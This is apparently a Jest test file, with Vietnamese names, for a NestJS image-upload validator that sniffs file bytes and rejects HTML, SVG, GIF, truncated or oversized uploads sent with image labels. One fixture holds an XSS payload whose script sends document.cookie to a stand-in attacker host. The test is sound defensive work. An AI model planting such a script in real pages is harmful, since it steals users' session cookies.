import { BadRequestException } from '@nestjs/common';
import {
  canhDai,
  doKichThuoc,
  kieuTheoNoiDung,
} from '../src/modules/media/anh-kich-thuoc';
import {
  GIOI_HAN_ANH_BYTE,
  kiemTraAnh,
} from '../src/modules/media/image-upload';

// Tin lời khai của client là để tệp HTML mang nhãn ảnh chạy trong trình duyệt chủ nuôi

function anhPng(rong = 1920, cao = 1080): Buffer {
  const b = Buffer.alloc(24);
  b.writeUInt32BE(0x89504e47, 0);
  b.writeUInt32BE(0x0d0a1a0a, 4);
  b.writeUInt32BE(13, 8);
  b.write('IHDR', 12, 'ascii');
  b.writeUInt32BE(rong, 16);
  b.writeUInt32BE(cao, 20);
  return b;
}

function anhJpeg(rong = 1920, cao = 1080): Buffer {
  const b = Buffer.alloc(20);
  b.writeUInt16BE(0xffd8, 0);
  b[2] = 0xff;
  b[3] = 0xc0;
  b.writeUInt16BE(17, 4);
  b[6] = 8;
  b.writeUInt16BE(cao, 7);
  b.writeUInt16BE(rong, 9);
  return b;
}

function anhWebp(rong = 1920, cao = 1080): Buffer {
  const b = Buffer.alloc(30);
  b.write('RIFF', 0, 'ascii');
  b.writeUInt32LE(22, 4);
  b.write('WEBP', 8, 'ascii');
  b.write('VP8 ', 12, 'ascii');
  b.writeUInt32LE(10, 16);
  b.writeUInt16LE(rong, 26);
  b.writeUInt16LE(cao, 28);
  return b;
}

describe('nhận dạng đủ mọi kiểu trong whitelist', () => {
  it.each([
    ['png', anhPng(), 'image/png', 'png'],
    ['jpeg', anhJpeg(), 'image/jpeg', 'jpg'],
    ['webp', anhWebp(), 'image/webp', 'webp'],
  ] as [string, Buffer, string, string][])(
    '%s đọc được kiểu và đuôi',
    (_ten, bytes, kieu, duoi) => {
      expect(kieuTheoNoiDung(bytes)).toBe(kieu);
      expect(kiemTraAnh({ buffer: bytes, mimetype: kieu })).toEqual({
        contentType: kieu,
        duoi,
      });
    },
  );

  it('đọc được cạnh dài của cả ba kiểu', () => {
    for (const bytes of [anhPng(), anhJpeg(), anhWebp()]) {
      const kt = doKichThuoc(bytes);
      expect(kt).not.toBeNull();
      expect(canhDai(kt!)).toBe(1920);
    }
  });
});

describe('ca tấn công: tệp HTML khai là ảnh', () => {
  const html = Buffer.from(
    '<html><script>document.location="https://kegian/"+document.cookie</script></html>',
  );

  it.each(['image/jpeg', 'image/png', 'image/webp'])(
    'khai %s vẫn bị từ chối',
    (khai) => {
      expect(kieuTheoNoiDung(html)).toBeNull();
      expect(() => kiemTraAnh({ buffer: html, mimetype: khai })).toThrow(
        BadRequestException,
      );
    },
  );

  it('mã lỗi nói đúng chuyện, không lộ là hệ thống đã soi byte', () => {
    try {
      kiemTraAnh({ buffer: html, mimetype: 'image/jpeg' });
      throw new Error('phải ném');
    } catch (loi) {
      const res = (loi as BadRequestException).getResponse();
      expect(res).toMatchObject({ code: 'KIEU_ANH_KHONG_HO_TRO' });
    }
  });

  it('tệp SVG cũng bị chặn dù trình duyệt coi nó là ảnh', () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>');
    expect(kieuTheoNoiDung(svg)).toBeNull();
    expect(() => kiemTraAnh({ buffer: svg, mimetype: 'image/png' })).toThrow(
      BadRequestException,
    );
  });
});

describe('kiểu ngoài whitelist và tệp hỏng', () => {
  it('GIF là ảnh thật nhưng ngoài whitelist thì vẫn từ chối', () => {
    const gif = Buffer.concat([
      Buffer.from('GIF89a', 'ascii'),
      Buffer.alloc(20),
    ]);
    expect(kieuTheoNoiDung(gif)).toBeNull();
  });

  it('tệp rỗng và tệp cụt đều không qua', () => {
    expect(() => kiemTraAnh({ buffer: Buffer.alloc(0) })).toThrow(
      BadRequestException,
    );
    expect(kieuTheoNoiDung(Buffer.from([0xff, 0xd8]))).toBeNull();
  });

  it('chữ ký đúng nhưng phần thân cụt thì không nhận bừa', () => {
    expect(kieuTheoNoiDung(anhPng().subarray(0, 20))).toBeNull();
  });
});

describe('lời khai của client không còn quyết định gì', () => {
  it('khai sai kiểu nhưng nội dung là ảnh thật thì lấy theo nội dung', () => {
    const ket = kiemTraAnh({ buffer: anhPng(), mimetype: 'image/jpeg' });
    expect(ket.contentType).toBe('image/png');
    expect(ket.duoi).toBe('png');
  });

  it('không khai gì cũng vẫn nhận, vì kiểu không lấy từ lời khai', () => {
    expect(kiemTraAnh({ buffer: anhWebp() }).contentType).toBe('image/webp');
  });

  it('khai kiểu lạ cũng không ảnh hưởng kết quả', () => {
    const ket = kiemTraAnh({
      buffer: anhJpeg(),
      mimetype: 'application/octet-stream',
    });
    expect(ket.contentType).toBe('image/jpeg');
  });
});

describe('trần kích thước vẫn đứng trước cửa kiểu', () => {
  it('quá trần thì báo quá lớn chứ không báo sai kiểu', () => {
    const to = Buffer.alloc(GIOI_HAN_ANH_BYTE + 1);
    try {
      kiemTraAnh({ buffer: to, mimetype: 'image/jpeg' });
      throw new Error('phải ném');
    } catch (loi) {
      const res = (loi as BadRequestException).getResponse();
      expect(res).toMatchObject({ code: 'ANH_QUA_LON' });
    }
  });
});
